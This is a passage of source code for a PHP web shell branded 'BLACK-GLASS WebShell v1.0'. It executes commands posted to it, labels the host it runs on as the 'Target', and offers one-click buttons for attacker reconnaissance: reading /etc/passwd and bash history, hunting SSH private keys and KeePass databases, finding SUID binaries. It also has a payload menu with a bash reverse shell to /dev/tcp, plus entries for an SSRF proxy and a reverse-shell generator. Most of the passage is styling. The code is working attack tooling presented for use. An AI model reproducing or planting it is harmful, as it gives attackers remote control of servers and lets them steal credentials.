    $last_cmd = $_POST['cmd'];
    $output_raw = exec_cmd($last_cmd);
    $cmd_result = htmlspecialchars($output_raw);
}

// ============================================================
// SYSTEM INFO — All original Phantom v3.0 preserved
// ============================================================
$hostname = @gethostname() ?: 'N/A';
$kernel = @php_uname('r') ?: 'N/A';
$arch = @php_uname('m') ?: 'N/A';
$os = @php_uname('s') ?: 'N/A';
$cwd = getcwd() ?: 'N/A';
$user = @get_current_user() ?: 'N/A';
$php_version = @phpversion() ?: 'N/A';
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
$sapi = @php_sapi_name() ?: 'N/A';
$disk_free = @disk_free_space('.') ? round(disk_free_space('.') / 1024 / 1024, 1) . ' MB' : 'N/A';
$disk_total = @disk_total_space('.') ? round(disk_total_space('.') / 1024 / 1024, 1) . ' MB' : 'N/A';
$server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
$server_port = $_SERVER['SERVER_PORT'] ?? 'N/A';
$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';
$safe_mode = @ini_get('safe_mode') ? 'ON' : 'OFF';
$load_avg = @exec('cat /proc/loadavg 2>/dev/null') ?: 'N/A';

$uid = 'N/A';
$gid = 'N/A';
if (function_exists('posix_getuid')) {
    $tmp = @posix_getuid();
    if ($tmp !== false)
        $uid = $tmp;
}
if (function_exists('posix_getgid')) {
    $tmp = @posix_getgid();
    if ($tmp !== false)
        $gid = $tmp;
}
if ($uid === 'N/A' || $gid === 'N/A') {
    $id_out = @exec('id 2>/dev/null');
    if ($id_out) {
        if (preg_match('/uid=(\d+)/', $id_out, $m))
            $uid = $m[1];
        if (preg_match('/gid=(\d+)/', $id_out, $m))
            $gid = $m[1];
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BLACK-GLASS WebShell v1.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap"
        rel="stylesheet">
    <style>
        html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }

        :root {
            --bg: #000a00;
            --surface: #000d00;
            --border: #0a3a0a;
            --blue: #00ff41;
            --green: #00ff41;
            --white: #b0ffb0;
            --gray: #2a6a2a;
            --dark: #000500;
            --red: #ff0040;
            --yellow: #ccff00;
            --purple: #aa00ff;
            --cyan: #00ffa5;
            --orange: #ff6600;
        }

        body {
            background: var(--surface);
            color: var(--white);
            font-family: 'Share Tech Mono', 'Consolas', monospace;
            font-size: 13px;
            line-height: 1.5;
            height: 100vh;
            overflow: hidden;
            margin: 0;
            padding: 0;
            position: relative;
        }

        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg);
        }

        ::-webkit-scrollbar-thumb {
            background: #0a3a0a;
            border-radius: 3px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--blue);
        }

        .header {
            background: linear-gradient(180deg, #001a00 0%, #000d00 100%);
            border-bottom: 1px solid var(--border);
            padding: 10px 20px;
            position: relative;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #00ff41, transparent);
            animation: headerGlow 3s ease-in-out infinite;
        }

        @keyframes headerGlow {

            0%,
            100% {
                opacity: 0.3;
            }

            50% {
                opacity: 1;
            }
        }

        .header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 15px;
        }

        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .header-center {
            display: flex;
            align-items: center;
            gap: 10px;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        .header-center .logo {
            font-size: 30px;
            color: var(--blue);
            text-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
            animation: iconPulse 2s ease-in-out infinite;
        }

        @keyframes iconPulse {

            0%,
            100% {
                text-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
            }

            50% {
                text-shadow: 0 0 25px rgba(0, 255, 65, 1), 0 0 50px rgba(0, 255, 65, 0.4);
            }
        }

        .header-center .name {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            font-weight: 700;
            letter-spacing: 3px;
        }

        .header-center .name .b {
            color: var(--blue);
            text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
        }

        .header-center .name .g {
            color: var(--white);
        }

        .header-center .name .v {
            color: var(--gray);
            font-size: 10px;
        }

        .header-right {
            display: flex;
            align-items: center;
            margin-left: auto;
            gap: 15px;
        }

        .header-right .logout-btn {
            background: transparent;
            border: 1px solid #3a2a2a;
            color: var(--gray);
            padding: 4px 12px;
            border-radius: 3px;
            cursor: pointer;
            font-family: inherit;
            font-size: 10px;
            text-decoration: none;
            transition: all 0.15s;
        }

        .header-right .logout-btn:hover {
            border-color: var(--red);
            color: var(--red);
        }

        .header-info {
            display: flex;
            justify-content: center;
            padding-top: 8px;
            margin-top: 6px;
            border-top: 1px solid rgba(10, 58, 10, 0.5);
        }

        .layout {
            display: flex;
            height: calc(100vh - 80px);
            margin: 0;
            padding: 0;
        }

        .sidebar-toggle {
            background: transparent;
            border: 1px solid #1a2a3a;
            border-radius: 3px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 3px;
            padding: 5px 6px;
            margin-right: 5px;
            transition: all 0.2s;
        }

        .sidebar-toggle:hover {
            border-color: var(--blue);
        }

        .sidebar-toggle span {
            width: 16px;
            height: 2px;
            background: var(--blue);
            border-radius: 1px;
            display: block;
        }

        .sidebar {
            width: 195px;
            min-width: 195px;
            background: linear-gradient(180deg, #001500 0%, #000a00 100%);
            border-right: 1px solid var(--border);
            overflow-y: auto;
            padding: 2px 0;
            transition: margin-left 0.3s ease;
            margin-left: -195px;
            z-index: 10;
        }

        .sidebar.show {
            margin-left: 0;
        }

        .sidebar .sec {
            margin-bottom: 1px;
        }

        .sidebar .sec-title {
            color: var(--blue);
            font-size: 8px;
            font-weight: 600;
            letter-spacing: 1px;
            padding: 5px 12px 2px;
            border-bottom: 1px solid var(--border);
            margin: 0 8px 2px 8px;
            cursor: pointer;
            user-select: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: color 0.15s;
        }

        .sidebar .sec-title:hover {
            color: var(--white);
        }

        .sidebar .sec-title .hl {
            color: var(--blue);
        }

        .sidebar .sec-title .title-text {
            color: var(--white);
            font-weight: bold;
        }

        .sidebar .sec-title .collapse {
            font-size: 7px;
            color: var(--gray);
            transition: transform 0.15s;
        }

        .sidebar .sec-title .collapse.open {
            transform: rotate(90deg);
        }

        .sidebar .sec-body {}

        .sidebar .sec-body.hidden {
            display: none;
        }

        .sidebar .btn {
            display: block;
            width: 100%;
            text-align: left;
            background: none;
            border: none;
            padding: 2.5px 12px;
            color: #5a7a9a;
            cursor: pointer;
            font-family: inherit;
            font-size: 10px;
            transition: all 0.1s;
        }

        .sidebar .btn:hover {
            background: rgba(0, 170, 255, 0.05);
            color: var(--white);
        }

        .sidebar .btn .hk {
            color: #3a4a5a;
            font-size: 8px;
            margin-right: 5px;
        }

        .fb {
            padding: 2px 0;
        }

        .fi {
            display: flex;
            align-items: center;
            gap: 3px;
            padding: 2px 12px;
            font-size: 10px;
            color: #5a7a9a;
            cursor: pointer;
            transition: all 0.1s;
        }

        .fi:hover {
            background: rgba(0, 170, 255, 0.04);
            color: var(--white);
        }

        .fi .nm {
            flex: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .fi .sz {
            color: var(--gray);
            font-size: 8px;
        }

        .fi.up {
            color: var(--blue);
        }

        .fi.dir {
            color: var(--yellow);
        }

        .fi.back {
            color: var(--blue);
        }

        .term-wrap {
            flex: 1;
            display: flex;
            flex-direction: column;
            min-height: 0;
            margin: 0;
            padding: 0;
        }

        .term-out {
            flex: 1;
            background: #000500;
            padding: 4px 16px 10px 16px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 12px;
            line-height: 1.4;
            position: relative;
        }

        .term-out::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 65, 0.015) 2px,
                    rgba(0, 255, 65, 0.015) 4px);
            pointer-events: none;
            z-index: 0;
        }

        .term-out .l {
            margin: 0;
            min-height: 0;
            line-height: 0.5;
            padding: 0;
        }

        .term-out .prompt {
            color: var(--green);
            line-height: 1.6;
        }

        .term-out .prompt .p {
            color: var(--blue);
        }

        .term-out .prompt .log {
            color: var(--white);
        }

        .term-out .out {
            color: var(--white);
            line-height: 1.6;
        }

        .term-out .err {
            color: var(--red);
            line-height: 1.6;
        }

        .term-out .info {
            color: var(--gray);
            line-height: 1.6;
        }

        .term-out .warn {
            color: var(--yellow);
            line-height: 1.6;
        }

        .term-out .ok {
            color: var(--green);
            line-height: 1.6;
        }

        .input-area {
            background: #000d00;
            border-top: 1px solid var(--border);
            padding: 6px 14px;
            display: flex;
            gap: 5px;
            align-items: center;
        }

        .input-area .ps1 {
            color: var(--green);
            font-size: 11px;
            white-space: nowrap;
            display: flex;
            gap: 2px;
            align-items: center;
        }

        .input-area .ps1 .log {
            color: var(--white);
            font-size: 13px;
            margin-right: 2px;
        }

        .input-area .ps1 .pth {
            color: var(--blue);
        }

        .input-area input[type="text"] {
            flex: 1;
            background: #000500;
            border: 1px solid var(--border);
            border-radius: 2px;
            padding: 7px 10px;
            color: var(--white);
            font-family: inherit;
            font-size: 13px;
            outline: none;
            transition: border 0.15s;
        }

        .input-area input[type="text"]:focus {
            border-color: var(--blue);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.15);
        }

        .input-area input[type="text"]::placeholder {
            color: #0a3a0a;
        }

        .input-area button {
            background: var(--dark);
            border: 1px solid #1a2a3a;
            border-radius: 3px;
            padding: 7px 14px;
            color: var(--gray);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            transition: all 0.15s;
        }

        .input-area button:hover {
            color: var(--white);
            border-color: var(--blue);
        }

        .input-area button.run {
            background: linear-gradient(135deg, #003300, #005500);
            border-color: var(--blue);
            color: var(--white);
        }

        .input-area button.run:hover {
            background: linear-gradient(135deg, #004400, #006600);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.25);
        }

        .input-area button.cls {
            background: transparent;
            border: 1px solid var(--border);
            color: var(--gray);
        }

        .input-area button.cls:hover {
            border-color: var(--red);
            color: var(--red);
        }

        .upload-panel {
            background: #000d00;
            border-top: 1px solid var(--border);
            padding: 0 14px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 8px;
            font-size: 10px;
            margin: 0;
            height: 28px;
            box-sizing: border-box;
        }

        .upload-panel form {
            display: flex;
            gap: 6px;
            align-items: center;
            margin: 0;
            line-height: 1;
        }

        .upload-panel .file-label {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: transparent;
            border: 1px solid #1a2a3a;
            border-radius: 3px;
            padding: 3px 10px;
            color: #5a7a9a;
            cursor: pointer;
            font-family: inherit;
            font-size: 9px;
            transition: all 0.15s;
            white-space: nowrap;
            line-height: 1;
            margin: 0;
        }

        .upload-panel .file-label:hover {
            color: var(--blue);
            border-color: var(--blue);
        }

        .upload-panel input[type="file"] {
            display: none;
        }

        .upload-panel .file-name {
            color: var(--gray);
            font-size: 9px;
            max-width: 120px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            line-height: 1;
            margin: 0;
        }

        .upload-panel .up-btn {
            background: transparent;
            border: 1px solid #1a2a3a;
            border-radius: 3px;
            padding: 3px 10px;
            color: #5a7a9a;
            cursor: pointer;
            font-family: inherit;
            font-size: 9px;
            transition: all 0.1s;
            line-height: 1;
            margin: 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .upload-panel .up-btn:hover {
            color: var(--blue);
            border-color: var(--blue);
        }

        /* ========== ADVANCED GUI WINDOWS (Modal-style) ========== */
        .bg-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.75);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(3px);
        }

        .bg-overlay.active {
            display: flex;
        }

        .bg-modal {
            background: linear-gradient(145deg, #001500 0%, #000a00 100%);
            border: 1px solid #0a5c1e;
            border-radius: 4px;
            width: 80%;
            max-width: 900px;
            max-height: 85vh;
            overflow: hidden;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.15), 0 0 80px rgba(0, 255, 65, 0.05);
            display: flex;
            flex-direction: column;
        }

        .bg-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            border-bottom: 1px solid var(--border);
            background: rgba(0, 60, 0, 0.15);
        }

        .bg-modal-header h3 {
            font-size: 14px;
            color: var(--blue);
            font-weight: 400;
            letter-spacing: 1px;
        }

        .bg-modal-header .close-btn {
            background: transparent;
            border: 1px solid #3a2a2a;
            color: var(--gray);
            padding: 4px 12px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
            transition: all 0.15s;
        }

        .bg-modal-header .close-btn:hover {
            border-color: var(--red);
            color: var(--red);
        }

        .bg-modal-body {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            font-size: 12px;
        }

        .bg-modal-body textarea {
            width: 100%;
            min-height: 300px;
            background: #050810;
            border: 1px solid #1a2a3a;
            border-radius: 4px;
            padding: 12px;
            color: var(--white);
            font-family: 'Consolas', monospace;
            font-size: 12px;
            resize: vertical;
            outline: none;
        }

        .bg-modal-body textarea:focus {
            border-color: var(--blue);
        }

        .bg-modal-footer {
            padding: 10px 20px;
            border-top: 1px solid #1a2a3a;
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            background: rgba(0, 20, 40, 0.05);
        }

        .bg-modal-footer button {
            background: transparent;
            border: 1px solid #1a2a3a;
            border-radius: 3px;
            padding: 7px 18px;
            color: var(--gray);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            transition: all 0.15s;
        }

        .bg-modal-footer button:hover {
            color: var(--white);
            border-color: var(--blue);
        }

        .bg-modal-footer button.primary {
            background: linear-gradient(135deg, #003300, #005500);
            border-color: var(--blue);
            color: var(--white);
        }

        .bg-modal-footer button.primary:hover {
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.25);
        }

        .bg-modal-footer button.danger:hover {
            border-color: var(--red);
            color: var(--red);
        }

        /* Database query table results */
        .bg-db-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 11px;
        }

        .bg-db-table th {
            background: #001500;
            color: var(--blue);
            padding: 6px 10px;
            text-align: left;
            border: 1px solid #1a2a3a;
            font-weight: 500;
        }

        .bg-db-table td {
            padding: 4px 10px;
            border: 1px solid #0d1a25;
            color: var(--white);
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .bg-db-table tr:nth-child(even) td {
            background: rgba(0, 20, 40, 0.1);
        }

        .bg-db-table tr:hover td {
            background: rgba(0, 170, 255, 0.05);
        }

        /* Form inputs in modals */
        .bg-form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .bg-form-row label {
            display: flex;
            flex-direction: column;
            gap: 3px;
            flex: 1;
            min-width: 120px;
        }

        .bg-form-row label span {
            font-size: 9px;
            color: var(--gray);
            letter-spacing: 0.5px;
        }

        .bg-form-row input,
        .bg-form-row select {
            background: #000500;
            border: 1px solid var(--border);
            border-radius: 3px;
            padding: 7px 10px;
            color: var(--white);
            font-family: inherit;
            font-size: 12px;
            outline: none;
            transition: border 0.15s;
        }

        .bg-form-row input:focus,
        .bg-form-row select:focus {
            border-color: var(--blue);
        }

        .bg-form-row select option {
            background: #000a00;
        }

        /* Output display */
        .bg-output {
            background: #000500;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 12px;
            margin-top: 10px;
            max-height: 400px;
            overflow: auto;
            white-space: pre-wrap;
            word-break: break-word;
            font-size: 11px;
            color: var(--white);
            line-height: 1.5;
        }

        .bg-output .success {
            color: var(--green);
        }

        .bg-output .error {
            color: var(--red);
        }

        .bg-output .info {
            color: var(--blue);
        }

        /* Tabs in modals */
        .bg-tabs {
            display: flex;
            gap: 0;
            border-bottom: 1px solid #1a2a3a;
            margin-bottom: 15px;
        }

        .bg-tabs button {
            background: transparent;
            border: none;
            border-bottom: 2px solid transparent;
            padding: 8px 16px;
            color: var(--gray);
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            transition: all 0.15s;
        }

        .bg-tabs button:hover {
            color: var(--white);
        }

        .bg-tabs button.active {
            color: var(--blue);
            border-bottom-color: var(--blue);
        }

        @media (max-width: 800px) {
            .sidebar {
                display: none;
            }
        }
    </style>
</head>

<body>

    <div class="header">
        <div class="header-top">
            <div class="header-brand">
                <button class="sidebar-toggle" onclick="toggleSidebar()">
                    <span></span>
                    <span></span>
                    <span></span>
                </button>
            </div>
            <div class="header-center">
                <span class="logo">☠</span>
                <span class="name"><span class="b">BLACK</span>-<span class="g">GLASS</span> <span
                        class="v">v1.0</span></span>
            </div>
            <div class="header-right">
                <span style="font-size: 13px; color: #2a6a2a; font-weight: 400;">
                    Target: <span style="color: #00ff41; font-weight: 500;"><?= htmlspecialchars($hostname) ?> @
                        <?= htmlspecialchars($server_ip) ?>:<?= htmlspecialchars($server_port) ?></span>
                </span>
                <a href="?logout=1" class="logout-btn">⏻ Logout</a>
            </div>
        </div>
        <div class="header-info">
            <span
                style="font-size: 9px; color: #2a6a2a; display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
                <span>USER <span style="color: var(--blue);"><?= htmlspecialchars($user) ?></span></span>
                <span>UID <span style="color: var(--blue);"><?= htmlspecialchars($uid) ?></span></span>
                <span>GID <span style="color: var(--blue);"><?= htmlspecialchars($gid) ?></span></span>
                <span>KERNEL <span style="color: var(--blue);"><?= htmlspecialchars($kernel) ?></span></span>
                <span>ARCH <span style="color: var(--blue);"><?= htmlspecialchars($arch) ?></span></span>
                <span>OS <span style="color: var(--blue);"><?= htmlspecialchars($os) ?></span></span>
                <span>LOAD <span style="color: var(--blue);"><?= htmlspecialchars($load_avg) ?></span></span>
                <span>DISK <span style="color: var(--blue);"><?= htmlspecialchars($disk_free) ?></span> / <span
                        style="color: var(--blue);"><?= htmlspecialchars($disk_total) ?></span></span>
                <span>SAFE <span
                        style="color: <?= $safe_mode === 'ON' ? '#ff0040' : 'var(--blue)' ?>"><?= htmlspecialchars($safe_mode) ?></span></span>
                <span>PHP <span style="color: var(--blue);"><?= htmlspecialchars($php_version) ?></span></span>
            </span>
        </div>
    </div>

    <div class="layout">
        <div class="sidebar" id="sidebar">
            <!-- ===== ORIGINAL PHANTOM SECTIONS PRESERVED ===== -->
            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[Files]</span> <span
                            class="title-text">Browse</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-browse">
                    <div class="fb" id="filebrowser"><span
                            style="color:#0a3a0a;font-size:9px;padding:4px 12px;">loading...</span></div>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[SYS]</span> <span
                            class="title-text">System</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-sys">
                    <button class="btn" onclick="cmd('id')"><span class="hk">F1</span>id</button>
                    <button class="btn" onclick="cmd('whoami')"><span class="hk">F2</span>whoami</button>
                    <button class="btn" onclick="cmd('uname -a')"><span class="hk">F3</span>uname -a</button>
                    <button class="btn" onclick="cmd('hostname')"><span class="hk">F4</span>hostname</button>
                    <button class="btn" onclick="cmd('cat /proc/version')"><span class="hk">F5</span>kernel
                        version</button>
                    <button class="btn" onclick="cmd('free -m')"><span class="hk">F6</span>memory</button>
                    <button class="btn" onclick="cmd('uptime')"><span class="hk">F7</span>uptime</button>
                    <button class="btn" onclick="cmd('cat /proc/cpuinfo | grep model')"><span class="hk">F8</span>cpu
                        info</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[DIR]</span> <span
                            class="title-text">Directory Ops</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-dir">
                    <button class="btn" onclick="cmd('ls -la')"><span class="hk">F9</span>ls -la</button>
                    <button class="btn" onclick="cmd('pwd')"><span class="hk">F10</span>pwd</button>
                    <button class="btn" onclick='cmd("find . -name \"*.php\"")'><span class="hk">F11</span>find php
                        files</button>
                    <button class="btn" onclick='cmd("find . -name \"*.txt\"")'><span class="hk">F12</span>find txt
                        files</button>
                    <button class="btn" onclick="cmd('find / -writable -type d 2>/dev/null | head -20')"><span
                            class="hk">S1</span>writable dirs</button>
                    <button class="btn" onclick="cmd('find / -writable -type f 2>/dev/null | head -20')"><span
                            class="hk">S2</span>writable files</button>
                    <button class="btn" onclick="cmd('ls -la /home 2>/dev/null')"><span class="hk">S3</span>home
                        dirs</button>
                    <button class="btn" onclick="cmd('ls -la /tmp 2>/dev/null')"><span class="hk">S4</span>tmp</button>
                    <button class="btn" onclick="cmd('ls -la /var/www/html 2>/dev/null')"><span class="hk">S5</span>web
                        root</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[CAT]</span> <span
                            class="title-text">Read Files</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-cat">
                    <button class="btn" onclick="cmd('cat /etc/passwd 2>/dev/null')"><span
                            class="hk">R1</span>passwd</button>
                    <button class="btn" onclick="cmd('cat /etc/hosts 2>/dev/null')"><span
                            class="hk">R2</span>hosts</button>
                    <button class="btn" onclick="cmd('cat /etc/hostname 2>/dev/null')"><span
                            class="hk">R3</span>hostname</button>
                    <button class="btn" onclick="cmd('cat /etc/resolv.conf 2>/dev/null')"><span
                            class="hk">R4</span>resolv.conf</button>
                    <button class="btn" onclick="cmd('cat /etc/fstab 2>/dev/null')"><span
                            class="hk">R5</span>fstab</button>
                    <button class="btn" onclick="cmd('cat /etc/group 2>/dev/null')"><span
                            class="hk">R6</span>group</button>
                    <button class="btn" onclick="cmd('cat /etc/crontab 2>/dev/null')"><span
                            class="hk">R7</span>crontab</button>
                    <button class="btn" onclick="cmd('cat /etc/*release 2>/dev/null')"><span class="hk">R8</span>os
                        release</button>
                    <button class="btn" onclick="cmd('ls -la /etc/cron* 2>/dev/null')"><span class="hk">R9</span>cron
                        dirs</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[NET]</span> <span
                            class="title-text">Network</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-net">
                    <button class="btn" onclick="cmd('netstat -tlnp 2>/dev/null')"><span class="hk">N1</span>listening
                        ports</button>
                    <button class="btn" onclick="cmd('netstat -anp 2>/dev/null')"><span class="hk">N2</span>all
                        connections</button>
                    <button class="btn" onclick="cmd('ip a 2>/dev/null')"><span class="hk">N3</span>ip
                        addresses</button>
                    <button class="btn" onclick="cmd('ip r 2>/dev/null')"><span class="hk">N4</span>routes</button>
                    <button class="btn" onclick="cmd('arp -a 2>/dev/null')"><span class="hk">N5</span>arp table</button>
                    <button class="btn" onclick="cmd('iptables -L -n 2>/dev/null')"><span
                            class="hk">N6</span>iptables</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[PRIV]</span> <span
                            class="title-text">Escalation</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-priv">
                    <button class="btn" onclick="cmd('sudo -l 2>/dev/null')"><span class="hk">P1</span>sudo -l</button>
                    <button class="btn" onclick="cmd('find / -perm -4000 -type f 2>/dev/null')"><span
                            class="hk">P2</span>suid bins</button>
                    <button class="btn" onclick="cmd('find / -perm -2000 -type f 2>/dev/null')"><span
                            class="hk">P3</span>sgid bins</button>
                    <button class="btn" onclick="cmd('cat ~/.bash_history 2>/dev/null | tail -30')"><span
                            class="hk">P4</span>bash history</button>
                    <button class="btn" onclick="cmd('find / -name id_rsa 2>/dev/null')"><span class="hk">P5</span>ssh
                        keys</button>
                    <button class="btn" onclick="cmd('find / -name \" *.kdbx\" 2>/dev/null')"><span
                            class="hk">P6</span>keepass dbs</button>
                    <button class="btn" onclick="cmd('w 2>/dev/null')"><span class="hk">P7</span>logged in</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[ENUM]</span> <span
                            class="title-text">Enumeration</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-enum">
                    <button class="btn" onclick="cmd('ps aux 2>/dev/null')"><span class="hk">E1</span>processes</button>
                    <button class="btn" onclick="cmd('env 2>/dev/null')"><span class="hk">E2</span>env vars</button>
                    <button class="btn" onclick="cmd('df -h 2>/dev/null')"><span class="hk">E3</span>disk usage</button>
                    <button class="btn" onclick="cmd('mount -l 2>/dev/null')"><span class="hk">E4</span>mounts</button>
                    <button class="btn" onclick="cmd('lsblk 2>/dev/null')"><span class="hk">E5</span>block
                        devices</button>
                    <button class="btn" onclick="cmd('which python3 python nc bash php perl 2>/dev/null')"><span
                            class="hk">E6</span>binaries</button>
                    <button class="btn" onclick="cmd('docker ps 2>/dev/null')"><span class="hk">E7</span>docker</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[PAYLOAD]</span> <span
                            class="title-text">Payloads</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-payload">
                    <button class="btn" onclick="cmd('which bash sh python perl nc php 2>/dev/null')"><span
                            class="hk">T1</span>shells avail</button>
                    <button class="btn" onclick="cmd('echo bash -i >& /dev/tcp/IP/PORT')"><span class="hk">T2</span>bash
                        rev</button>
                    <button class="btn" onclick="cmd('echo python3 -c shellcode')"><span class="hk">T3</span>python
                        rev</button>
                    <button class="btn" onclick="cmd('echo php -r shellcode')"><span class="hk">T4</span>php
                        rev</button>
                </div>
            </div>

            <!-- ===== NEW BLACK-GLASS ADVANCED SECTIONS ===== -->
            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[ADV]</span> <span
                            class="title-text">Advanced Tools</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-adv">
                    <button class="btn" onclick="openFileEditor()"><span class="hk">F1</span>File Editor</button>
                    <button class="btn" onclick="openHexDump()"><span class="hk">F2</span>Hex Dump</button>
                    <button class="btn" onclick="openSearch()"><span class="hk">F3</span>Search Files</button>
                    <button class="btn" onclick="openFileMeta()"><span class="hk">F4</span>File Metadata</button>
                    <button class="btn" onclick="openZipTool()"><span class="hk">F5</span>Zip Tool</button>
                    <button class="btn" onclick="openChmod()"><span class="hk">F6</span>Permissions</button>
                    <button class="btn" onclick="openDownload()"><span class="hk">F7</span>Download File</button>
                    <button class="btn" onclick="openHash()"><span class="hk">F8</span>Hash & Encode</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[NET-ADV]</span> <span
                            class="title-text">Network Pro</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-net-adv">
                    <button class="btn" onclick="openPortScan()"><span class="hk">N1</span>Port Scanner</button>
                    <button class="btn" onclick="openWhois()"><span class="hk">N2</span>WHOIS Lookup</button>
                    <button class="btn" onclick="openDNSLookup()"><span class="hk">N3</span>DNS Lookup</button>
                    <button class="btn" onclick="openSSRF()"><span class="hk">N4</span>SSRF Proxy</button>
                    <button class="btn" onclick="openRevShell()"><span class="hk">N5</span>Rev Shell Gen</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[DB]</span> <span
                            class="title-text">Database</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-db">
                    <button class="btn" onclick="openDBQuery()"><span class="hk">D1</span>Database Query</button>
                </div>
            </div>

            <div class="sec">
                <div class="sec-title" onclick="toggleSec(this)"><span><span class="hl">[PROC]</span> <span
                            class="title-text">Process Mgr</span></span><span class="collapse">▶</span></div>
                <div class="sec-body hidden" id="sec-proc">
                    <button class="btn" onclick="openProcessMgr()"><span class="hk">P1</span>Process List</button>
                    <button class="btn" onclick="openCrontab()"><span class="hk">P2</span>Crontab Manager</button>
                </div>
            </div>
        </div>

        <div class="term-wrap">
            <div class="term-out" id="output">
                <div class="l" style="color:#00ff41;">+--------------------------------------------+</div>
                <div class="l" style="color:#00ff41;">| BLACK-GLASS v1.0 — ------------------------|</div>
                <div class="l" style="color:#00ff41;">+--------------------------------------------+</div>
                <div class="l" style="color:#0a5c1e;">[TARGET] <span
                        style="color:#00ff41;"><?= htmlspecialchars($hostname) ?> @
                        <?= htmlspecialchars($server_ip) ?>:<?= htmlspecialchars($server_port) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[SYSTEM] <span style="color:#00ff41;"><?= htmlspecialchars($os) ?>
                        <?= htmlspecialchars($kernel) ?> <?= htmlspecialchars($arch) ?></span></div>
                <div class="l" style="color:#0a5c1e;">[USER] <span style="color:#00ff41;"><?= htmlspecialchars($user) ?>
                        (UID:<?= htmlspecialchars($uid) ?> / GID:<?= htmlspecialchars($gid) ?>)</span></div>
                <div class="l" style="color:#0a5c1e;">[PHP] <span
                        style="color:#00ff41;"><?= htmlspecialchars($php_version) ?> |
